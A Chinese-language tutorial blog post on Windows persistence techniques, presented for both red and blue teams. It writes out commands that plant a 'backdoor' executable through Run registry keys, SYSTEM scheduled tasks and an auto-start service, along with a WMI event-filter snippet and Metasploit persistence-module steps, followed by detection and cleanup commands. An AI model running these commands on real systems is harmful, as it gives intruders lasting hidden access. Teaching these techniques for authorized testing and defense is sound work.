---
title: Windows 内网持久化：从注册表到计划任务
slug: kali-4-windows持久化-6f7g8
date: 2026-09-12
visibility: public
tags: Kali Linux, Windows安全, 持久化, 注册表, 计划任务, 后渗透, 教程
---

# Windows 内网持久化：从注册表到计划任务

> 渗透测试拿下权限只是第一步，真正的较量在**持久化**——重启不掉、杀软难清。本文详解 Windows 最常见的持久化技术与对应的检测方法，红蓝两用。

## 一、持久化原理

持久化 = 让恶意程序在**重启、杀软查杀、权限变更后依然存活**。

```
持久化点
├─ 注册表 Run 键
├─ 启动文件夹
├─ 计划任务
├─ 服务（Service）
├─ WMI 事件订阅
├─ DLL 劫持
└─ 用户初始化脚本
```

## 二、常见持久化手法

### 1. 注册表 Run 键（最经典）

```cmd
# 当前用户启动项
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "C:\evil.exe"

# 所有用户（需管理员）
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "C:\evil.exe"

# RunOnce（运行一次后删除）
```

> 检测：`reg query HKLM\...\Run` 或 autoruns 工具。

### 2. 启动文件夹

```cmd
# 当前用户
C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
# 所有用户
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
```

### 3. 计划任务（SCHTASKS）

```cmd
schtasks /create /tn "Updater" /tr "C:\evil.exe" /sc onlogon /ru SYSTEM

# 每隔 30 分钟运行
schtasks /create /tn "Keep" /tr "cmd.exe /c C:\evil.exe" /sc minute /mo 30
```

### 4. 服务持久化

```cmd
sc create backdoor binPath= "C:\evil.exe" start= auto
sc start backdoor
```

### 5. WMI 事件订阅（隐蔽持久化）

```powershell
# WMI 永久事件订阅（不落地文件，隐蔽）
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name="Backdoor"; EventNamespace='root\cimv2';
    Query="SELECT * FROM __InstanceCreationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_Process'"
}
```

## 三、从 Kali 利用（MSF/C2 视角）

```bash
# Metasploit 自带持久化模块
use exploit/windows/local/persistence
set SESSION 1
set RUN_KEY true
run

# Cobalt Strike 的 Beacon 持久化
# → execute assembly / persist 模块
```

## 四、检测与清除

### 检测

```
- autoruns（查看所有自启动）
- reg query Run 键
- schtasks /query
- 查看计划任务目录
- 检查 WMI 事件订阅
- 启动文件夹检查
```

### 清除（蓝队）

```cmd
reg delete HKLM\...\Run /v backdoor
schtasks /delete /tn "Updater"
sc delete evil
```

## 五、持久化 vs 清除：红蓝对决

```
红队目标：隐蔽、长效、不易察觉
蓝队手段：全网自启动排查 + EDR 行为分析 + 异常计划任务

对抗升级：
- 红队用无文件（fileless）、WMI/内存加载
- 蓝队用行为监控、机器学习检测
```

## 六、Kali 常用工具

| 工具 | 用途 |
|------|------|
| msfvenom | 生成持久化载荷 |
| mettle | C2 |
| mimikatz | 抓凭据 |
| Empire | 持久化框架 |
| PSExec | 远程执行 |
| PowerSploit | PowerShell 攻击 |

## 安全合规

> 持久化是典型的高级持续威胁（APT）手段。测试只能在授权系统进行，测试结束后必须**彻底清除**所有持久化痕迹。

## 小结

- 注册表 Run / 启动文件夹是最基础的持久化
- 计划任务与服务适合"长期潜伏"
- WMI 事件最隐蔽但难清除
- 检测核心：autoruns + 计划任务 + 行为监控
- 测试完必清痕迹，专业且合规

> 下一篇：红队基础设施——API 前置与 CDN 隐藏。